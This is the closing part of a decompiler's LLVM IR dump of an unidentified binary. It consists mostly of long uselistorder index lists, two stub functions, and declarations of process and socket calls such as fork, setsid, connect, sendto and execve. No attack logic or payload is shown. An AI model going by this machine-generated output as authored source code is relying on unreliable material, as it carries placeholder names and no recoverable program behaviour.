16, 15, 12, 14, 11, 10, 17, 13, 608, 1157, 610, 609, 98, 99, 100, 101, 407, 441, 613, 612, 611, 614, 304, 615, 233, 234, 616, 227, 617, 305, 618, 262, 619, 306, 620, 307, 621, 186, 622, 2, 626, 625, 624, 623, 140, 141, 469, 627, 408, 470, 628, 178, 629, 961, 634, 633, 632, 631, 630, 255, 256, 259, 258, 257, 1252, 1253, 637, 636, 635, 260, 638, 376, 924, 925, 370, 926, 639, 332, 336, 331, 333, 335, 337, 334, 927, 409, 471, 472, 473, 474, 962, 640, 163, 377, 906, 641, 142, 144, 145, 143, 146, 204, 203, 963, 361, 410, 964, 643, 642, 151, 152, 155, 153, 154, 644, 160, 156, 162, 158, 157, 159, 161, 645, 168, 170, 169, 171, 172, 173, 646, 647, 648, 650, 649, 1292, 411, 653, 652, 651, 308, 309, 654, 148, 149, 147, 150, 655, 176, 177, 175, 174, 656, 209, 208, 412, 1256, 657, 183, 184, 475, 476, 372, 661, 660, 659, 658, 182, 181, 390, 662, 310, 663, 266, 664, 231, 665, 232, 666, 138, 667, 311, 668, 139, 669, 132, 477, 1192, 373, 1193, 1194, 478, 1213, 673, 672, 671, 670, 133, 135, 136, 134, 674, 675, 1214, 1215, 677, 676, 313, 314, 312, 1293, 678, 967, 968, 969, 970, 3, 1158, 1159, 679, 315, 1225, 1226, 1227, 1228, 1229, 1230, 1231, 391, 1160, 1195, 1196, 1197, 1198, 1199, 1200, 1201, 1202, 1203, 1204, 1205, 1206, 1207, 1208, 1209, 1210, 1211, 1212, 239, 237, 238, 240, 241, 1232, 364, 90, 89, 88, 392, 1233, 1107, 1106, 865, 866, 867, 868, 869, 870, 871, 1297, 130, 131, 128, 129, 1161, 127, 126, 479, 680, 426, 1162, 481, 1163, 1164, 413, 414, 1165, 1166, 482, 1167, 1169, 1170, 1171, 483, 1173, 415, 1174, 1172, 480, 1175, 484, 1176, 427, 1177, 1178, 1168, 684, 683, 682, 681, 103, 110, 106, 111, 105, 104, 112, 113, 107, 108, 109, 1179, 685, 316, 318, 317, 321, 320, 319, 686, 251, 250, 1180, 1181, 1182, 687, 91, 92, 428, 378, 1184, 379, 1185, 416, 1186, 1187, 1189, 365, 1190, 485, 1191, 380, 1188, 419, 695, 694, 693, 692, 691, 690, 689, 688, 93, 95, 96, 97, 94, 486, 393, 696, 352, 353, 354, 1183, 442, 531, 697, 698, 322, 487, 907, 908, 699, 324, 323, 325, 1294, 443, 1295, 1296, 700, 327, 326, 702, 701, 703, 704, 1241, 705, 35, 706, 60, 707, 120, 121, 708, 328, 709, 252, 710, 254, 711, 329, 712, 253, 122, 713, 330, 236, 714, 263, 715, 349, 716, 350, 717, 718, 338, 719, 339, 720, 265, 721, 340, 722, 341, 351, 272, 444, 1128, 1129, 445, 1257, 1258, 359, 1259, 909, 366, 381, 910, 911, 912, 360, 490, 913, 914, 915, 916, 917, 918, 919, 488, 489, 433, 491, 728, 727, 726, 725, 724, 723, 920, 921, 735, 734, 733, 732, 731, 532, 730, 729, 922, 923, 737, 736, 928, 929, 492, 493, 494, 495, 496, 739, 738, 930, 931, 498, 932, 933, 934, 497, 935, 355, 746, 745, 744, 743, 742, 741, 740, 264, 936, 937, 938, 499, 939, 356, 754, 753, 752, 751, 750, 749, 748, 747, 271, 946, 947, 948, 949, 950, 951, 500, 759, 758, 757, 756, 755, 267, 268, 501, 760, 952, 953, 954, 955, 502, 956, 957, 958, 767, 766, 765, 764, 763, 762, 761, 269, 270, 959, 773, 772, 771, 770, 769, 768, 503, 960, 778, 777, 776, 775, 774, 504, 505, 782, 781, 780, 779, 783, 788, 787, 538, 786, 537, 785, 784, 791, 790, 789, 965, 872, 873, 874, 875, 876, 877, 878, 879, 880, 881, 882, 883, 884, 885, 886, 887, 506, 888, 889, 890, 891, 864, 966, 800, 799, 798, 797, 796, 795, 794, 793, 792, 344, 343, 342, 448, 971, 972, 973, 507, 974, 803, 802, 801, 805, 804, 449, 975, 806, 115, 116, 808, 807, 4, 508, 976, 422, 810, 809, 977, 812, 811, 446, 978, 509, 510, 980, 979, 511, 815, 814, 813, 450, 981, 982, 512, 513, 514, 983, 533, 984, 515, 816, 447, 516, 985, 517, 986, 822, 821, 820, 819, 818, 817, 417, 418, 823, 420, 1216, 1217, 1218, 518, 367, 1219, 1220, 1221, 519, 1222, 827, 826, 825, 824, 534, 1223, 828, 261, 1224, 829, 520, 1234, 832, 831, 830, 1235, 535, 137, 452, 1242, 1243, 451, 1244, 1245, 453, 454, 1246, 1247, 833, 1248, 5, 6, 1251, 1249, 1250, 521, 837, 836, 835, 834, 1254, 1255, 839, 838, 843, 842, 841, 840, 846, 845, 844, 848, 847, 1260, 1261, 522, 1271, 1272, 423, 1273, 851, 850, 849, 434, 7, 855, 854, 853, 852, 395, 1262, 1263, 1264, 394, 1265, 1269, 1270, 523, 857, 856, 524, 1266, 1267, 1268, 859, 858, 114, 1274, 1275, 860, 536, 46, 396, 1276, 1277, 861, 345, 1278, 235, 862, 863, 348, 347, 346, 539 }
  uselistorder label %.preheader, { 1, 0 }
}

define i32 @call___do_global_ctors_aux() local_unnamed_addr {
entry:
  %v5_1bdd0 = load i32, i32* @r0, align 4
  ret i32 %v5_1bdd0

; uselistorder directives
  uselistorder i32* @r0, { 8, 9, 10, 172, 11, 173, 174, 175, 176, 177, 178, 179, 12, 182, 180, 181, 13, 56, 57, 183, 184, 7, 185, 186, 187, 188, 189, 190, 14, 191, 192, 193, 194, 195, 196, 197, 198, 199, 200, 201, 202, 203, 204, 205, 206, 207, 208, 209, 210, 211, 212, 213, 214, 215, 216, 217, 218, 219, 220, 221, 222, 223, 224, 225, 226, 227, 228, 229, 230, 231, 232, 140, 141, 142, 143, 16, 18, 234, 19, 235, 237, 238, 20, 274, 275, 46, 269, 276, 277, 52, 53, 54, 55, 21, 30, 31, 32, 153, 154, 33, 49, 278, 279, 73, 22, 159, 160, 161, 162, 163, 164, 58, 59, 60, 61, 62, 169, 170, 281, 23, 24, 271, 25, 270, 280, 155, 26, 258, 259, 260, 15, 261, 262, 45, 239, 240, 241, 17, 242, 243, 244, 3, 27, 245, 246, 4, 6, 0, 1, 247, 248, 5, 249, 250, 251, 28, 252, 253, 254, 2, 255, 256, 257, 236, 63, 64, 65, 284, 285, 156, 157, 29, 44, 283, 282, 34, 47, 48, 35, 233, 36, 272, 37, 273, 39, 38, 66, 67, 68, 69, 70, 50, 71, 72, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86, 87, 88, 89, 90, 91, 92, 93, 94, 95, 96, 97, 98, 99, 100, 101, 102, 103, 104, 105, 106, 107, 108, 109, 110, 111, 112, 113, 114, 115, 116, 117, 118, 119, 120, 121, 122, 123, 124, 125, 126, 127, 128, 129, 130, 131, 132, 133, 134, 135, 136, 137, 138, 139, 144, 145, 146, 147, 148, 149, 150, 151, 152, 158, 165, 166, 167, 168, 171, 263, 264, 265, 266, 267, 268, 40, 41, 42, 43, 51 }
}

define i32 @_fini() local_unnamed_addr {
entry:
  %v3_1bdd8 = load i32, i32* @r4, align 4
  %v0_1bde0 = call i32 @__do_global_dtors_aux()
  call void @__pseudo_branch(i32 %v3_1bdd8)
  ret i32 %v0_1bde0

; uselistorder directives
  uselistorder void (i32)* @__pseudo_branch, { 2, 13, 4, 5, 6, 7, 8, 18, 19, 15, 16, 17, 0, 20, 10, 1, 9, 11, 12, 3, 14 }
  uselistorder i32 0, { 0, 1199, 1200, 1201, 1202, 108, 1203, 168, 1204, 1205, 1206, 1207, 1208, 1209, 1210, 169, 926, 929, 927, 928, 1211, 1212, 1213, 1214, 1215, 1216, 170, 1217, 1218, 1219, 1220, 1221, 1222, 1223, 1224, 1, 1225, 1226, 1227, 48, 88, 1228, 1229, 1230, 1231, 1232, 1233, 1242, 1243, 1234, 1235, 1236, 1237, 1238, 1239, 1240, 1241, 1244, 171, 1245, 1246, 1247, 357, 358, 1248, 1249, 930, 1250, 1251, 1263, 359, 360, 1254, 1255, 172, 1256, 1257, 1259, 1258, 1260, 1261, 292, 1262, 164, 165, 166, 1264, 1252, 1253, 78, 79, 1265, 1267, 1268, 1266, 1269, 1270, 1271, 1272, 100, 1273, 1274, 101, 1275, 102, 1276, 103, 1277, 175, 977, 173, 978, 979, 980, 174, 981, 89, 90, 982, 176, 983, 361, 30, 362, 984, 985, 293, 177, 363, 364, 986, 178, 1278, 1279, 1280, 1282, 179, 1281, 243, 365, 1283, 366, 49, 50, 51, 52, 124, 125, 180, 181, 1284, 126, 1285, 300, 299, 298, 2, 97, 53, 1104, 1105, 1286, 1287, 1106, 182, 1288, 931, 1289, 121, 127, 1290, 1291, 1295, 1292, 1293, 1294, 244, 1296, 346, 1298, 1297, 245, 1299, 1300, 1301, 296, 1302, 1303, 1304, 1305, 80, 1306, 1307, 183, 1308, 1309, 1310, 1311, 1312, 1313, 1314, 1315, 1316, 1317, 1318, 1319, 1320, 1321, 1322, 31, 1323, 1324, 128, 1325, 1326, 1327, 184, 1328, 1329, 1330, 1331, 1332, 1333, 1334, 1335, 1336, 1337, 1338, 1339, 1340, 1341, 185, 301, 1342, 1343, 1344, 367, 1345, 1346, 1347, 1348, 1349, 1350, 1351, 1352, 54, 1354, 1353, 91, 1355, 1356, 368, 1373, 1357, 1358, 1359, 4, 3, 306, 290, 291, 297, 1360, 1361, 1363, 1364, 129, 238, 1366, 369, 1367, 1369, 5, 1371, 1372, 1374, 370, 307, 1365, 1362, 1375, 1376, 186, 1377, 1378, 6, 1619, 1620, 1621, 1622, 188, 187, 1623, 189, 1107, 1108, 7, 932, 1379, 55, 130, 1380, 1381, 246, 8, 933, 248, 1382, 56, 131, 1383, 1384, 247, 1700, 1701, 1702, 1703, 1706, 1707, 1708, 1709, 1710, 1711, 1712, 1713, 1704, 1705, 1714, 1715, 1716, 1717, 1718, 1719, 1720, 1721, 32, 1722, 1723, 1724, 1725, 33, 1726, 1727, 34, 1728, 1729, 35, 1730, 1731, 1732, 1733, 1734, 1735, 1736, 1737, 1738, 1739, 1740, 1741, 1742, 1743, 1746, 1747, 1748, 1749, 1750, 1751, 1752, 1753, 1744, 1745, 1754, 1755, 1756, 1757, 1758, 1759, 1760, 1761, 36, 1762, 1763, 1764, 1765, 37, 1766, 1767, 1768, 1769, 38, 1770, 1771, 1772, 1773, 1774, 1775, 1776, 1777, 1778, 1779, 1780, 1781, 1385, 1386, 1387, 1388, 1389, 1390, 1391, 1392, 1393, 1394, 1395, 1396, 1397, 1398, 1408, 190, 1409, 1410, 1411, 1412, 1413, 1414, 1415, 1416, 1417, 1418, 1419, 1420, 1421, 1422, 1423, 1424, 39, 1425, 1426, 1427, 1428, 1429, 1430, 1431, 132, 99, 1432, 1433, 191, 192, 1434, 1435, 1436, 1437, 193, 1438, 1439, 1440, 1441, 1442, 1443, 1444, 1445, 1446, 40, 1447, 1448, 1449, 1450, 1451, 1452, 1453, 294, 1454, 57, 194, 1455, 195, 371, 1456, 1457, 1458, 1459, 1460, 1461, 41, 1462, 1463, 1464, 1465, 1466, 1467, 1468, 372, 1469, 1470, 1471, 1472, 196, 1473, 1474, 1475, 42, 1476, 122, 1477, 1478, 1479, 1480, 1481, 1482, 1483, 1484, 9, 1485, 1486, 1487, 934, 1488, 1489, 1490, 1491, 1492, 1493, 1495, 1494, 1496, 1497, 1498, 1499, 1500, 1501, 1502, 1503, 1504, 1505, 1506, 1507, 1508, 1512, 1513, 133, 1509, 1510, 10, 1511, 249, 1514, 250, 1515, 1516, 134, 1517, 1632, 1648, 1649, 1650, 1651, 1149, 1782, 1783, 1784, 1635, 1785, 1636, 1786, 1787, 197, 1788, 106, 1789, 104, 105, 1790, 1791, 1792, 373, 374, 375, 1796, 376, 1808, 1813, 935, 251, 1814, 377, 1812, 378, 379, 11, 1793, 1794, 198, 1150, 308, 1151, 382, 310, 309, 1152, 1153, 1154, 1155, 381, 1156, 1157, 380, 1158, 1637, 199, 1795, 1016, 1017, 1018, 1019, 1020, 1021, 201, 135, 1022, 1023, 1024, 107, 200, 1025, 202, 1159, 1160, 383, 1165, 384, 987, 136, 988, 137, 989, 203, 1168, 1169, 1170, 1171, 12, 1182, 1183, 13, 990, 991, 936, 81, 992, 347, 993, 386, 1797, 387, 311, 1798, 1799, 1801, 1802, 385, 1654, 1656, 1657, 58, 252, 1658, 1655, 1652, 1653, 14, 1661, 1659, 1660, 253, 1662, 1663, 388, 15, 1664, 204, 1665, 1666, 1667, 1668, 1669, 1670, 16, 17, 1161, 1162, 1163, 1164, 389, 18, 390, 1370, 1147, 923, 1166, 924, 1671, 1607, 1193, 1009, 1368, 1592, 1593, 205, 1594, 1598, 1599, 1600, 1601, 391, 1602, 1603, 1624, 206, 207, 1604, 392, 312, 1809, 208, 19, 209, 1518, 1519, 211, 1520, 393, 210, 1521, 92, 20, 1612, 1613, 1522, 1523, 254, 21, 1524, 1595, 1596, 1597, 22, 1614, 1615, 1616, 23, 1815, 1816, 93, 212, 1525, 1526, 1527, 1528, 1529, 1530, 1531, 1532, 1533, 1534, 138, 1535, 1536, 1537, 1538, 1539, 213, 1540, 1542, 1543, 1541, 1544, 139, 1545, 1546, 214, 1547, 215, 295, 394, 1548, 1549, 216, 217, 1550, 1551, 1552, 1553, 1554, 1555, 313, 1556, 1557, 395, 1558, 314, 1560, 222, 1562, 219, 220, 1559, 218, 1561, 1563, 1565, 141, 1566, 1567, 223, 82, 83, 1568, 1569, 140, 396, 1570, 1571, 224, 397, 1572, 1573, 221, 1574, 1575, 1576, 1577, 1578, 1579, 1580, 1581, 1582, 1583, 398, 1585, 109, 86, 1584, 1586, 1587, 1588, 24, 973, 225, 974, 120, 84, 98, 1564, 255, 1589, 1590, 1591, 994, 25, 257, 226, 996, 995, 256, 315, 1811, 167, 1167, 937, 1672, 1172, 1800, 997, 1608, 1630, 998, 1638, 1803, 110, 1804, 1698, 1810, 1639, 1699, 1807, 1640, 1191, 1641, 1642, 999, 1008, 1805, 1806, 26, 1399, 142, 1400, 1401, 240, 239, 938, 111, 112, 113, 114, 940, 939, 60, 59, 143, 1402, 1403, 1404, 1405, 1407, 1406, 27, 1673, 1674, 242, 241, 941, 115, 116, 117, 118, 943, 942, 62, 61, 47, 85, 1675, 944, 28, 1676, 1677, 119, 1678, 1679, 1680, 1681, 1682, 227, 945, 948, 946, 947, 1683, 949, 302, 404, 1000, 405, 258, 406, 1001, 403, 45, 46, 407, 1002, 1003, 408, 413, 414, 558, 559, 63, 316, 399, 400, 401, 317, 402, 1004, 409, 1005, 410, 411, 1006, 415, 416, 412, 1007, 228, 318, 259, 1011, 417, 1010, 419, 420, 418, 421, 422, 1012, 1013, 348, 1014, 423, 1015, 424, 144, 145, 146, 147, 148, 149, 150, 151, 152, 153, 154, 451, 1026, 319, 425, 320, 1027, 1028, 448, 1029, 1032, 449, 1030, 450, 1031, 267, 1033, 447, 452, 1034, 1035, 444, 1036, 1039, 445, 1037, 446, 1038, 266, 1040, 453, 1041, 441, 231, 1042, 1045, 442, 1043, 443, 232, 1044, 265, 1046, 454, 1047, 438, 230, 1048, 1051, 439, 1049, 440, 233, 1050, 264, 1052, 455, 1053, 435, 1054, 1057, 436, 1055, 437, 1056, 263, 1058, 1059, 432, 1060, 1063, 433, 1061, 434, 1062, 262, 1064, 456, 1065, 429, 229, 1066, 1069, 430, 1067, 431, 234, 1068, 261, 1070, 457, 1071, 426, 1072, 1075, 427, 1073, 428, 1074, 260, 1076, 458, 1077, 459, 1078, 1079, 460, 1080, 1081, 1082, 461, 1083, 1084, 1085, 462, 1086, 1087, 463, 1088, 1089, 1090, 1091, 94, 1092, 466, 464, 1093, 471, 470, 269, 1094, 468, 465, 469, 467, 268, 1095, 1096, 64, 472, 473, 1097, 1098, 43, 95, 1099, 476, 474, 477, 475, 270, 1100, 1101, 65, 478, 479, 1102, 1103, 44, 1109, 303, 1110, 482, 1111, 66, 321, 1112, 1113, 1114, 1121, 481, 1115, 1116, 1117, 1118, 1119, 1120, 271, 1122, 483, 1123, 349, 1124, 1125, 480, 1126, 1127, 1128, 1129, 1130, 155, 485, 1131, 67, 322, 1132, 1133, 123, 350, 1134, 486, 1135, 484, 1136, 1137, 487, 1138, 68, 323, 1139, 488, 1140, 1141, 489, 1142, 1143, 1144, 324, 491, 492, 490, 493, 494, 235, 1145, 1146, 325, 326, 327, 1148, 495, 304, 886, 887, 496, 950, 951, 952, 953, 954, 955, 956, 957, 958, 959, 960, 961, 962, 963, 964, 515, 965, 516, 966, 967, 517, 518, 497, 968, 519, 514, 276, 277, 505, 969, 970, 971, 506, 972, 507, 508, 509, 510, 511, 512, 513, 925, 1173, 274, 275, 498, 499, 500, 501, 502, 503, 504, 272, 273, 520, 521, 1174, 522, 1175, 351, 288, 1176, 1177, 328, 524, 525, 526, 527, 528, 523, 278, 529, 1178, 530, 352, 1179, 1180, 1181, 96, 156, 157, 69, 70, 531, 236, 1184, 329, 330, 331, 332, 538, 1185, 1187, 1188, 1189, 533, 1190, 534, 535, 536, 532, 279, 537, 1186, 353, 540, 541, 539, 333, 29, 543, 542, 544, 1192, 334, 335, 336, 337, 1194, 1195, 547, 545, 546, 280, 1196, 1197, 1198, 237, 1605, 548, 549, 1606, 71, 555, 72, 554, 550, 1609, 553, 282, 556, 551, 1610, 552, 281, 557, 73, 87, 1611, 338, 560, 561, 562, 1618, 563, 1617, 565, 566, 564, 567, 568, 1625, 1626, 354, 1627, 1628, 158, 1629, 74, 355, 1631, 283, 569, 570, 571, 572, 1633, 1634, 305, 1643, 1644, 573, 1645, 574, 1646, 1647, 575, 159, 576, 577, 578, 579, 580, 1694, 160, 75, 289, 284, 341, 342, 1684, 1685, 1686, 285, 339, 340, 343, 1687, 1688, 344, 1689, 1690, 287, 76, 161, 162, 286, 1692, 1693, 356, 163, 77, 581, 1691, 1695, 1696, 345, 1697, 975, 976, 582, 583, 584, 585, 586, 587, 588, 589, 590, 591, 592, 593, 594, 595, 596, 597, 598, 599, 600, 601, 602, 603, 604, 605, 606, 607, 608, 609, 610, 611, 612, 613, 614, 615, 616, 617, 618, 619, 620, 621, 622, 623, 624, 625, 626, 627, 628, 629, 630, 631, 632, 633, 634, 635, 636, 637, 638, 639, 640, 641, 642, 643, 644, 645, 646, 647, 648, 649, 650, 651, 652, 653, 654, 655, 656, 657, 658, 659, 660, 661, 662, 663, 664, 665, 666, 667, 668, 669, 670, 671, 672, 673, 674, 675, 676, 677, 678, 679, 680, 681, 682, 683, 684, 685, 686, 687, 688, 689, 690, 691, 692, 693, 694, 695, 696, 697, 698, 699, 700, 701, 702, 703, 704, 705, 706, 707, 708, 709, 710, 711, 712, 713, 714, 715, 716, 717, 718, 719, 720, 721, 722, 723, 724, 725, 726, 727, 728, 729, 730, 731, 732, 733, 734, 735, 736, 737, 738, 739, 740, 741, 742, 743, 744, 745, 746, 747, 748, 749, 750, 751, 752, 753, 754, 755, 756, 757, 758, 759, 760, 761, 762, 763, 764, 765, 766, 767, 768, 769, 770, 771, 772, 773, 774, 775, 776, 777, 778, 779, 780, 781, 782, 783, 784, 785, 786, 787, 788, 789, 790, 791, 792, 793, 794, 795, 796, 797, 798, 799, 800, 801, 802, 803, 804, 805, 806, 807, 808, 809, 810, 811, 812, 813, 814, 815, 816, 817, 818, 819, 820, 821, 822, 823, 824, 825, 826, 827, 828, 829, 830, 831, 832, 833, 834, 835, 836, 837, 838, 839, 840, 841, 842, 843, 844, 845, 846, 847, 848, 849, 850, 851, 852, 853, 854, 855, 856, 857, 858, 859, 860, 861, 862, 863, 864, 865, 866, 867, 868, 869, 870, 871, 872, 873, 874, 875, 876, 877, 878, 879, 880, 881, 882, 883, 884, 885, 888, 889, 890, 891, 892, 893, 894, 895, 896, 897, 898, 899, 900, 901, 902, 903, 904, 905, 906, 907, 908, 909, 910, 911, 912, 913, 914, 915, 916, 917, 918, 919, 920, 921, 922, 1817, 1818, 1819, 1820, 1821, 1822, 1823, 1824, 1825, 1826, 1827, 1828, 1829, 1830, 1831 }
  uselistorder i32* @r4, {}
}

declare i32 @vfork() local_unnamed_addr

declare i32 @fork() local_unnamed_addr

declare i32 @fcntl(i32, i32, ...) local_unnamed_addr

declare void @exit(i32) local_unnamed_addr

declare i32 @close(i32) local_unnamed_addr

declare i32 @getpid() local_unnamed_addr

declare i32 @open(i8*, i32, ...) local_unnamed_addr

declare i32 @pipe([2 x i32]) local_unnamed_addr

declare i32 @read(i32, i32*, i32) local_unnamed_addr

declare i32 @setsid() local_unnamed_addr

declare i32 @sigprocmask(i32, %_TYPEDEF_sigset_t*, %_TYPEDEF_sigset_t*) local_unnamed_addr

declare i32 @time(i32*) local_unnamed_addr

declare i32 @write(i32, i32*, i32) local_unnamed_addr

declare i32 @connect(i32, %sockaddr*, i32) local_unnamed_addr

declare i32 @getsockname(i32, %sockaddr*, i32*) local_unnamed_addr

declare i32 @recv(i32, i32*, i32, i32) local_unnamed_addr

declare i32 @send(i32, i32*, i32, i32) local_unnamed_addr

declare i32 @sendto(i32, i32*, i32, i32, %sockaddr*, i32) local_unnamed_addr

declare i32 @setsockopt(i32, i32, i32, i32*, i32) local_unnamed_addr

declare i32 @sigreturn(%sigcontext*) local_unnamed_addr

declare i32 @sigaction(i32, %sigaction*, %sigaction*) local_unnamed_addr

declare i32 @execve(i8*, [1 x i8*], [1 x i8*]) local_unnamed_addr

declare i32 @nanosleep(%timespec*, %timespec*) local_unnamed_addr

declare i32 @brk(i32*) local_unnamed_addr

declare i32 @poll(%pollfd*, i32, i32) local_unnamed_addr

declare i32 @__decompiler_undefined_function_0() local_unnamed_addr

declare i8* @__decompiler_undefined_function_1() local_unnamed_addr

declare i8 @__decompiler_undefined_function_2() local_unnamed_addr

declare i8** @__decompiler_undefined_function_3() local_unnamed_addr

; Function Attrs: nounwind readnone
declare i32 @llvm.bswap.i32(i32) #1

declare float @fabsf(float)

attributes #0 = { noreturn }
attributes #1 = { nounwind readnone }
